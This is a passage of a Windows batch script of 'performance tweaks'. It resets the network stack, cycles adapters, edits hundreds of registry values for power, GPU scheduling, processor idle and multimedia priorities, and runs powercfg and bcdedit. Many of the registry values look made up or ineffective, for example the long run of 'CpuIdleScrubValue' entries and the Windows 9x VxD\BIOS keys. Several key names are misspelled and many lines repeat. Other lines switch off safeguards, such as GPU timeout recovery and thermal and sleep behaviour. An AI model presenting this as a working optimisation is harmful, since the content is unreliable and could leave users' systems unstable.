Reg.exe ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Enum\%%n\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties" /v "MessageNumberLimit" /t REG_DWORD /d "256" /f
)
cls
ipconfig /release
ipconfig /renew
ipconfig /flushdns
netsh winsock reset
netsh int ip reset
netsh interface ip delete arpcache
for /f "tokens=*" %%a in ('netsh interface show interface ^| findstr /c:"Connected"') do (
    set "line=%%a"
    for /f "tokens=1,2,3 delims= " %%b in ("!line!") do (
        netsh interface set interface name="%%d" admin=disable
        timeout /t 2 >nul
        netsh interface set interface name="%%d" admin=enable
    )
)
cls
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%a\Device Parameters" /v SelectiveSuspendOn /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%a\Device Parameters" /v AllowIdleIrpInD3 /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%a\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%s\Device Parameters" /v SelectiveSuspendOn /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%s\Device Parameters" /v AllowIdleIrpInD3 /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Enum\%%s\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
reg.exe add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Enum\%%i\Device Parameters" /v "EnableSelectiveSuspend" /t REG_DWORD /d "0" /f > nul
Reg.exe add "HKLM\System\CurrentControlSet\Enum\%%a\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "LOWLATENCY" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "Node3DLowLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "24" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDebugMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "VsyncIdleTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDebugMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v TdrLevel /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v TdrDelay /t REG_DWORD /d 60 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "GPUPreemptionLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableAsyncMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidGfxPreemptionVGPU" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableMidBufferPreemptionForHighTdrTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableSCGMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "PerfAnalyzeMidBufferPreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDr" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "QosManagesIdleProcessors" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableVsyncLatencyUpdate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableSensorWatchdog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InterruptSteeringDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LowLatencyScalingPercentage" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableVsyncLatencyUpdate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableSensorWatchdog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InterruptSteeringDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RMDisablePostL2Compression" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RmDisableRegistryCaching" /t REG_DWORD /d "1" /f 
fsutil behavior query memoryusage
fsutil behavior set memoryusage 2
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPCONCURRENCY" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleThreshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuLatencyTimer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuDebuggingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorLatencyThrottlingEnabled" /t REG_DWORD /d "0" /f
powercfg -setacvalueindex scheme_current sub_processor IDLEPROMOTE 98
powercfg -setacvalueindex scheme_current sub_processor IDLEDEMOTE 98
powercfg -setacvalueindex scheme_current sub_processor IDLECHECK 20000
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current SUB_SLEEP AWAYMODE 0
powercfg -setacvalueindex scheme_current SUB_SLEEP ALLOWSTANDBY 0
powercfg -setacvalueindex scheme_current SUB_SLEEP HYBRIDSLEEP 0
powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 100
powercfg /setactive SCHEME_CURRENT
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubType" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueFirst" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueIndex" /t REG_DWORD /d "42" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueName" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDescription" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueVisible" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueHidden" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadnv11" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValuenv11Only" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAutomatic" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabledByDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
powercfg -setacvalueindex scheme_current sub_none DEVICEIDLE 0
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor IDLESCALING 1
powercfg /setactive SCHEME_CURRENT
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\IntelPPM" /v Start /t REG_DWORD /d 3 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AmdPPM" /v Start /t REG_DWORD /d 3 /f
powercfg -setacvalueindex scheme_current sub_processor PERFEPP 0
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor THROTTLING 0
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor PERFBOOSTMODE 1
powercfg -setacvalueindex scheme_current sub_processor PERFBOOSTPOL 100
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100
powercfg /setactive SCHEME_CURRENT
Powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMAX 100
Powercfg -setactive scheme_current
Powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 100
Powercfg -setactive scheme_current
Powercfg -setdcvalueindex scheme_current sub_processor PROCTHROTTLEMAX 100
Powercfg -setactive scheme_current
Powercfg -setdcvalueindex scheme_current sub_processor PROCTHROTTLEMIN 50
Powercfg -setactive scheme_current
bcdedit /set {current} numproc %NUMBER_OF_PROCESSORS% 
powercfg -setacvalueindex 95533644-e700-4a79-a56c-a89e8cb109d9 238c9fa8-0aad-41ed-83f4-97be242c8f20 25dfa149-5dd1-4736-b5ab-e8a37b5b8187 0
Powercfg -setactive scheme_current
powercfg -setdcvalueindex 95533644-e700-4a79-a56c-a89e8cb109d9 238c9fa8-0aad-41ed-83f4-97be242c8f20 25dfa149-5dd1-4736-b5ab-e8a37b5b8187 0
Powercfg -setactive scheme_current
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "BackgroundPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "BackgroundPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl\Parameters" /v "ThreadPriority" /t REG_DWORD /d "15" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Parameters" /v "ThreadPriority" /t REG_DWORD /d "15" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f
